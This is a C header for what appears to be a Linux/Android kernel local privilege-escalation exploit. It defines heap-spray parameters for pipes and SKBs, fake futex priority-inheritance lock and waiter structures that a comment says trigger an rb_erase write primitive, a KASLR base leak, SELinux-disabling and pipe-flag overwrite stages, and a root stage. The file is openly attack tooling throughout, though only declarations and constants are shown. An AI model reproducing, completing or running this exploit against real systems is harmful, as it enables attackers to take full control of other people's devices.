#ifndef COMMON_H
#define COMMON_H

#define _GNU_SOURCE
#define __ARM 1

#include "offset.h"

#define PAGE_SHIFT 12
#define PAGE_SIZE (1UL << PAGE_SHIFT)
#define KS_PAGE_SIZE 4096
#define KS_PAGE_MASK 0xfffULL

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "kernelsnitch/utils.h"

#define SKB_DATA_DELTA (-0xe80LL)

#define SELINUX_KERNEL_PAGE_SETUP_ATTEMPTS 12
#define PIPE_FLAG_KERNEL_PAGE_SETUP_ATTEMPTS 2

#define ASHMEM_NAME_LEN 256
#define __ASHMEMIOC 0x77
#define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])

#define MM_STRUCT_SZ 0x500
#define MM_ORDER 3
#define MM_PARTIALS 5
#define KSNITCH_COLLISIONS 4

#define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
#define SKB_RECLAIM_SENDS 4
#define SKB_FRAG_BIAS 0

/*
 * FAKE_TASK_PRIO / FAKE_WAITER_PRIO are the crafted priorities in the SKB
 * payload fake structures.  FAKE_WAITER_TREE_PRIO (200) only needs to be
 * worse than the consumer's new_prio so that stale_waiter displaces fake_w0
 * as fake_lock's top waiter, triggering the rb_erase write primitive.
 */
#define FAKE_TASK_PRIO 120
#define FAKE_WAITER_PRIO 200

#define TASK_COMM_LEN 16

#define KMALLOC_SHIFT_HIGH (PAGE_SHIFT + 1)
#define KMALLOC_BUCKETS (KMALLOC_SHIFT_HIGH + 1)
#define KMALLOC_NORMAL_TYPE 0
#define KMALLOC_CGROUP_TYPE 2
#define KMALLOC_PIPE_INDEX 11
#define KMALLOC_CACHE_TYPES 4
#define KMALLOC_CACHE_SLOTS (KMALLOC_CACHE_TYPES * KMALLOC_BUCKETS)
#define KMALLOC_CACHE_SLOT(type, index) \
  (KMALLOC_CACHES + ((type) * KMALLOC_BUCKETS + (index)) * 8)
#define KMALLOC_CGROUP_PIPE_SLOT \
  KMALLOC_CACHE_SLOT(KMALLOC_CGROUP_TYPE, KMALLOC_PIPE_INDEX)
#define KMALLOC_PIPE_OBJ_SIZE 0x800

#define PIPE_OBJECT_SIZE KMALLOC_PIPE_OBJ_SIZE
#define PIPE_OBJS_PER_SLAB 16
#define PIPE_DRAIN_SLABS 15
#define PIPE_RECLAIM_SLABS 15  // 1-15
#define PIPE_DRAIN (PIPE_OBJS_PER_SLAB * PIPE_DRAIN_SLABS)
#define PIPE_RECLAIM (PIPE_OBJS_PER_SLAB * PIPE_RECLAIM_SLABS)

extern int pipe_fds_drain[PIPE_DRAIN][2];
extern int pipe_fds_reclaim[PIPE_RECLAIM][2];

#define CORE 2
#define WAITER_CORE 4

#define PAGE_PAYLOAD_SELINUX 2
#define PAGE_PAYLOAD_PIPE_FLAG 3
#define PHASE_SELINUX 2
#define PHASE_PIPE_FLAG 3
#define SELINUX_PHASE_ATTEMPTS 10
#define PIPE_FLAG_PHASE_ATTEMPTS 20

#define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
#define P0_DATA_ALIAS_CONST(image_addr) \
  (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))

#define SLIDE_RANDOM_BOOT_ID_DATA \
  P0_DATA_ALIAS_CONST(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE)
#define SLIDE_SYSCTL_BOOTID P0_DATA_ALIAS_CONST(SLIDE_SYSCTL_BOOTID_IMAGE)

int slide_leak_kernel_base(void);

struct kernelsnitch_shared_state;

struct local_sched_attr {
  uint32_t size;
  uint32_t sched_policy;
  uint64_t sched_flags;
  int32_t sched_nice;
  uint32_t sched_priority;
  uint64_t sched_runtime;
  uint64_t sched_deadline;
  uint64_t sched_period;
};

struct mm_ctx {
  size_t mm_cnt;
  pid_t *childs;
  int *memfds;
};

struct ks_spray_state {
  struct mm_ctx pre;
  struct mm_ctx post;
  struct mm_ctx spray;
  struct kernelsnitch_shared_state *ks;
  int leak_memfd;
  size_t objs_per_slab;
};


extern pid_t pipe_prepare_child;
extern uintptr_t page_base;
extern uintptr_t fake_lock;
extern uintptr_t fake_w0;
extern uintptr_t fake_task;
extern uintptr_t fake_pipe_flag;

extern uint32_t f_wait;
extern uint32_t f_pi_target;
extern uint32_t f_pi_chain;
extern atomic_int waiter_ready;
extern atomic_int waiter_waiting;
extern atomic_int owner_started;
extern atomic_int owner_chain_done;
extern atomic_int route_done;
extern atomic_int waiter_tid;
extern atomic_int punch_consume_go;
extern atomic_int punch_consume_stop;
extern atomic_int consumer_calls;
extern atomic_int consumer_success;
extern atomic_int current_phase;
extern uintptr_t pipebuf_page_base;
extern int kaslr_done;
extern uint64_t kaslr_base;
extern uint64_t kaslr_slide;
extern int route_verified;

int run_exploit(int argc, char **argv);
void read_first_line(const char *path, char *buf, size_t len);
int is_selinux_enforcing(void);
void disable_rseq_for_thread(void);
long futex_op(
  uint32_t *uaddr, int op, uint32_t val,
  const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
const char *pipe_overwrite_target(void);
void init_p0_from_env(void);
uintptr_t p0_data_alias(uintptr_t image_addr);
uintptr_t data_addr(uintptr_t image_addr);
uintptr_t kaslr_image_addr(uintptr_t image_addr);
uintptr_t text_addr(uintptr_t image_addr);
void put64(unsigned char *p, size_t off, uint64_t value);
void put32(unsigned char *p, size_t off, uint32_t value);
int clone_memfd(void);
pid_t clone_child(void);
pid_t clone_leak_child(struct kernelsnitch_shared_state *ks_ptr);
int open_memfd(pid_t child);
void kill_child(pid_t child);
void close_reclaim_sockets(void);
void close_ctx_memfds(struct mm_ctx *ctx);
void free_ctx_storage(struct mm_ctx *ctx);
int prepare_skb_payload(uintptr_t base, int payload_mode);
int ks_spray_collisions(struct ks_spray_state *s, size_t objs_per_slab, int mm_partials);
void ks_spray_pcp_shape(struct ks_spray_state *s, unsigned char *buf);
uintptr_t ks_spray_result(struct ks_spray_state *s);
uintptr_t prepare_kernel_page(int payload_mode);
uintptr_t prepare_good_kernel_page(int payload_mode);

void primer_aio_init(void);
void prime_fake_lock(void);

void *waiter_thread(void *arg);
void *owner_thread(void *arg);
void *consumer_thread(void *arg);
void reset_main_route_state(void);
void run_main_route_threads(void);
int do_root_stage();

void init_ctx(struct mm_ctx *ctx, size_t cnt);
void resize_pipe_slots(int pipefd[2], size_t slots);
void make_pipe_object(int pipefd[2]);
void alloc_pipe_object(int pipefd[2]);
uintptr_t prepare_pipe_buffer_page_child(void);
uintptr_t prepare_pipe_buffer_page(void);
void reset_pipe_attempt(void);
int try_pipe_flags_stage(void);

#endif
